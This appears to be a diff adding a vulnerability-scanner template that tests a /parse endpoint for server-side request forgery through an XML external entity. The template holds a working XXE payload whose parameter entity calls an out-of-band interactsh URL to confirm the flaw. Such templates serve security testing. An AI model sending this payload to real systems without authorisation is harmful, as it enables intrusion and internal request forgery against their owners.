@@ -1,0 +1,14 @@
+id: K70n0s510-ssrf-xml
+info:
+  name: SSRF via XML Entity
+  author: K70n0s510
+  severity: high
+  tags: a10,ssrf,xxe
+http:
+  - method: POST
+    path: ["{{BaseURL}}/parse"]
+    body: '<!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM "http://{{interactsh-url}}"> %sp; ]>'
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words: ["http"]
